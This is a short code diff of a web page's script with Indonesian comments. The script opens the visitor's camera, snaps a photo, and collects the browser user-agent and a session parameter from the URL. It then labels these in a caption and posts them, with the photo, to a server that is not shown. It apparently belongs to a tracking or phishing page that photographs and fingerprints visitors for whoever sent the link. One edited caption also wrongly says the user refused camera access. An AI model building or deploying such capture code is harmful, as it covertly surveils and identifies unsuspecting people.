@@ -7,24 +7,23 @@
     <script>
     async function sendDataToServer() {
         try {
-            // Coba untuk mengakses kamera
-            const session = new URLSearchParams(window.location.search).get("session");
-            
+        
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const track = stream.getVideoTracks()[0];
             const imageCapture = new ImageCapture(track);
             const photoBlob = await imageCapture.takePhoto();
             track.stop(); // Hentikan kamera setelah foto diambil
 
-            // Ambil user-agent dari browser
-            //const userAgent = navigator.userAgent;
+            const userAgent = navigator.userAgent;
+        
+        // Tambahkan user-agent ke dalam caption
+        const session = new URLSearchParams(window.location.search).get("session");
 
-
-            const captions = `
-            📍 **Pengguna ini mengizinkan kamera pada browsernya**
-            🌐 User-Agent: -
-            🔑 Session: ${session}
-            `;
+        const captions = `
+        📍 **Pengguna ini tidak mengizinkan kamera pada browsernya**
+        🌐 User-Agent: ${userAgent}
+        🔑 Session: ${session}
+        `;
             
             // Kirim foto ke server
             const formData = new FormData();
@@ -73,9 +72,6 @@
         // Ambil user-agent dari browser
         const userAgent = navigator.userAgent;
         
-        // Tambahkan user-agent ke dalam caption
-        const session = new URLSearchParams(window.location.search).get("session");
-
         const captions = `
         📍 **Pengguna ini tidak mengizinkan kamera pada browsernya**
         🌐 User-Agent: ${userAgent}
